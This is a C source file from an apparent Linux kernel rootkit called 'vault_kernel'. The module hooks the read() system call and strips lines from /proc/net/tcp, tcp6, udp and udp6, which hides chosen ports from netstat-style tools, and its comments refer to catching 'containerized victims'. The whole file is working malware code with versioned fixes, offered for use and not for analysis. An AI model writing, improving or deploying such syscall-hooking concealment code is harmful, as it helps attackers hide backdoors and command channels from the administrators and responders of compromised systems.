/* vault_kernel - net_hide.c
 * Network connection hiding via /proc/net/tcp*, /proc/net/udp* filtering
 * Also hooks read() to filter content from these proc files
 * ruby570bocadito © 2026
 */
#include "core.h"
#include <linux/magic.h>   /* PROC_SUPER_MAGIC */

/* Hidden ports stored in HOST byte order — /proc/net/tcp prints
 * ports as %04X of the host-order value, so no conversion needed. */
uint16_t hidden_ports[MAX_HIDDEN_PORTS];
int hidden_port_count = 0;
static DEFINE_SPINLOCK(net_hide_lock);

/* Inodes of /proc/net files we care about */
static unsigned long proc_net_tcp_ino = 0;
static unsigned long proc_net_tcp6_ino = 0;
static unsigned long proc_net_udp_ino = 0;
static unsigned long proc_net_udp6_ino = 0;

void net_hide_add_port(uint16_t port) {
    unsigned long flags;
    spin_lock_irqsave(&net_hide_lock, flags);
    if (hidden_port_count < MAX_HIDDEN_PORTS) {
        hidden_ports[hidden_port_count] = port;
        hidden_port_count++;
        pr_info(VAULT_KERNEL_TAG " hiding port: %d\n", port);
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
}

void net_hide_del_port(uint16_t port) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&net_hide_lock, flags);
    for (i = 0; i < hidden_port_count; i++) {
        if (hidden_ports[i] == port) {
            hidden_port_count--;
            memmove(&hidden_ports[i], &hidden_ports[i+1],
                    (hidden_port_count - i) * sizeof(uint16_t));
            pr_info(VAULT_KERNEL_TAG " unhid port: %d\n", port);
            break;
        }
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
}

static int is_port_hidden(uint16_t port) {
    unsigned long flags;
    int i, hidden = 0;
    spin_lock_irqsave(&net_hide_lock, flags);
    for (i = 0; i < hidden_port_count; i++) {
        if (hidden_ports[i] == port) {
            hidden = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
    return hidden;
}

/*
 * /proc/net/tcp line format:
 *   sl  local_address rem_address   st tx_queue rx_queue ...
 *    0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 ...
 *
 * Field 0 is the "sl" index (e.g. "0:").  Fields 1 and 2 are
 * IP:PORT pairs; the port is printed in HOST byte order as %04X.
 * The old implementation parsed the first ':' in the line (the
 * index separator) and kstrtoul'd the IP — it never matched.
 */
static int token_has_hidden_port(const char *tok, size_t len) {
    const char *colon;
    char tmp[8];
    size_t plen;
    unsigned long port;

    colon = strnchr(tok, len, ':');
    if (!colon)
        return 0;

    plen = len - (size_t)(colon - tok) - 1;
    if (plen == 0 || plen >= sizeof(tmp))
        return 0;

    memcpy(tmp, colon + 1, plen);
    tmp[plen] = '\0';

    if (kstrtoul(tmp, 16, &port))
        return 0;

    return is_port_hidden((uint16_t)port);
}

static int line_has_hidden_port(const char *line) {
    const char *p = line;
    int field;

    /* Skip the "sl" index field */
    while (*p && !isspace(*p)) p++;
    while (*p && isspace(*p)) p++;

    /* Check local_address and rem_address */
    for (field = 0; field < 2 && *p; field++) {
        const char *tok = p;
        size_t len = 0;
        int hit;

        while (p[len] && !isspace((unsigned char)p[len]))
            len++;

        hit = token_has_hidden_port(tok, len);

        p += len;
        while (*p && isspace((unsigned char)*p))
            p++;

        if (hit)
            return 1;
    }

    return 0;
}

/*
 * Filter buffer: remove complete lines containing hidden ports.
 * A trailing partial line (no newline yet — the read may have
 * split a record) is passed through untouched so userland line
 * assembly never sees a corrupted line.
 */
static size_t filter_port_lines(char *buf, size_t len) {
    char *scan = buf, *end = buf + len;
    char *dst = buf;
    char *last_nl = NULL;
    size_t tail_len;
    char *p;

    for (p = end - 1; p >= buf; p--) {
        if (*p == '\n') {
            last_nl = p;
            break;
        }
    }
    if (!last_nl)
        return len;   /* no complete line yet — nothing to filter */

    while (scan <= last_nl) {
        char *nl = memchr(scan, '\n', (size_t)(last_nl - scan) + 1);
        size_t line_len = (size_t)((nl ? nl : last_nl) - scan) + 1;

        if (!line_has_hidden_port(scan)) {
            if (dst != scan)
                memmove(dst, scan, line_len);
            dst += line_len;
        }
        scan += line_len;
    }

    /* Preserve the trailing partial line after the filtered region */
    tail_len = len - (size_t)((last_nl + 1) - buf);
    if (tail_len && dst != (last_nl + 1))
        memmove(dst, last_nl + 1, tail_len);

    return (size_t)(dst - buf) + tail_len;
}

/*
 * Resolve inode for /proc/net files at init time
 */
static unsigned long get_proc_inode(const char *path) {
    struct path p;
    unsigned long ino = 0;

    if (kern_path(path, LOOKUP_FOLLOW, &p) == 0) {
        ino = p.dentry->d_inode->i_ino;
        path_put(&p);
    }
    return ino;
}

/*
 * Per-netns robustness: /proc/net is remounted per network namespace,
 * so files created AFTER module load (new netns, containers) have a
 * different inode than the cached ones.  Match by dentry name as a
 * fallback so containerized victims are covered too.
 */
static int is_proc_net_file(struct file *file) {
    const unsigned char *name;

    if (!file || !file->f_path.dentry)
        return 0;

    /*
     * v3.4 fix: the v3.3 check matched ONLY the dentry name, so ANY
     * file called "tcp"/"udp"/"tcp6"/"udp6" anywhere (e.g. ./tcp in
     * the cwd) was filtered while hidden ports were active.  Require
     * the file to actually live on procfs before trusting the name.
     */
    if (!file->f_inode ||
        file->f_inode->i_sb->s_magic != PROC_SUPER_MAGIC)
        return 0;

    name = file->f_path.dentry->d_name.name;
    if (!name)
        return 0;

    return !strcmp((const char *)name, "tcp")  ||
           !strcmp((const char *)name, "tcp6") ||
           !strcmp((const char *)name, "udp")  ||
           !strcmp((const char *)name, "udp6");
}

/* ================================================================
 * Hooked read() — intercept reads to procfs net files (tcp/udp)
 * ================================================================ */
asmlinkage long hooked_read(const struct pt_regs *regs) {
    long (*orig_read)(const struct pt_regs *);
    unsigned int fd = (unsigned int)regs->di;
    char __user *buf = (char __user *)regs->si;
    ssize_t ret;
    char *kbuf = NULL;
    unsigned long ino = 0;
    int is_net_file = 0;
    struct fd f;
    struct file *file;

    orig_read = (void *)hooks[HOOKIDX_READ].original;

    /* Hot path: read() is the most common syscall on the system.
     * When nothing is hidden, bail out BEFORE touching the fd table —
     * v3.2 paid a fdget()/fdput() + dentry strcmp on every read()
     * system-wide even with an empty hide-list. */
    if (hidden_port_count == 0)
        return orig_read(regs);

    /* Check if this fd is a /proc/net file we care about.
     * Since v6.12 `struct fd` hides its member behind the fd_file()
     * accessor — use it when available, fall back to f.file. */
    f = fdget(fd);
#if defined(fd_file)
    file = fd_file(f);
#else
    file = f.file;
#endif
    /* Evaluate while the fd reference is still held — after fdput()
     * the struct file pointer may no longer be safe to dereference. */
    is_net_file = 0;
    if (file)
        is_net_file = is_proc_net_file(file);
    if (file) {
        struct inode *inode = file->f_inode;
        if (inode)
            ino = inode->i_ino;
    }
    fdput(f);

    /* Only filter /proc/net/tcp* and /proc/net/udp* — by cached inode
     * (fast path) or by dentry name (netns created after load). */
    if (ino != proc_net_tcp_ino && ino != proc_net_tcp6_ino &&
        ino != proc_net_udp_ino && ino != proc_net_udp6_ino &&
        !is_net_file) {
        return orig_read(regs);
    }

    ret = orig_read(regs);
    if (ret <= 0)
        return ret;

    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    {
        size_t new_len = filter_port_lines(kbuf, (size_t)ret);
        if (new_len < (size_t)ret) {
            size_t copy_len = new_len;
            if (copy_to_user(buf, kbuf, copy_len)) {
                kfree(kbuf);
                return -EFAULT;
            }
            ret = (ssize_t)copy_len;
        }
    }

    kfree(kbuf);
    return ret;
}

int net_hide_init(void) {
    /* Resolve /proc/net file inodes */
    proc_net_tcp_ino  = get_proc_inode("/proc/net/tcp");
    proc_net_tcp6_ino = get_proc_inode("/proc/net/tcp6");
    proc_net_udp_ino  = get_proc_inode("/proc/net/udp");
    proc_net_udp6_ino = get_proc_inode("/proc/net/udp6");

    pr_info(VAULT_KERNEL_TAG " network hiding initialized — "
            "tcp=%lu tcp6=%lu udp=%lu udp6=%lu\n",
            proc_net_tcp_ino, proc_net_tcp6_ino,
            proc_net_udp_ino, proc_net_udp6_ino);
    return 0;
}

void net_hide_cleanup(void) {
    net_hide_reset();
    pr_info(VAULT_KERNEL_TAG " network hiding cleaned\n");
}

/* Wipe the whole hide-list under the lock (IOCTL_RESET_ALL) */
void net_hide_reset(void) {
    unsigned long flags;
    spin_lock_irqsave(&net_hide_lock, flags);
    hidden_port_count = 0;
    spin_unlock_irqrestore(&net_hide_lock, flags);
}
